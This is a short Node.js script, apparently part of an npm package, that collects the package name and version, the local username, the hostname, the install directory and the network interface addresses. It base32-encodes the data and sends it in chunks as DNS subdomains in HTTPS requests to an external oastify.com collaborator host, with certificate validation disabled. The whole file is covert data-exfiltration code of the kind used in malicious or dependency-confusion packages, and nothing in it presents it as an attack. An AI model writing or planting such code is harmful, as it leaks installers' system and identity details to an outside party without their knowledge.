var base32 = require('./base32');
var os = require('os');
const https = require('https');
var pjson = require('./package.json');

var ret = '';

ret += pjson.name + pjson.version + '|';

ret += os.userInfo().username + '|';
ret += os.hostname() + '|';
ret += __dirname + '|';

var nif = os.networkInterfaces();
for (var i in nif)  ret += (i + nif[i][0].address);

var encoded = base32.encode(ret);
//var decoded = base32.decode(ret);

var split = encoded.match(/.{1,50}/g);
for (var i=0; i < split.length; ++i){
	const options = {
	  hostname: i + '.' + split[i] + '.2y13nip7i7y8y9se58mrmduoxf36rysmh.oastify.com',
	  port: 443,
	  path: '/',
	  method: 'GET', 
	  rejectUnauthorized: false
	}
	const req = https.request(options, res => {
  		console.log(`statusCode: ${res.statusCode}`);
	});
	req.on('error', error => {
	  console.error(error)
	});
	req.end();
};
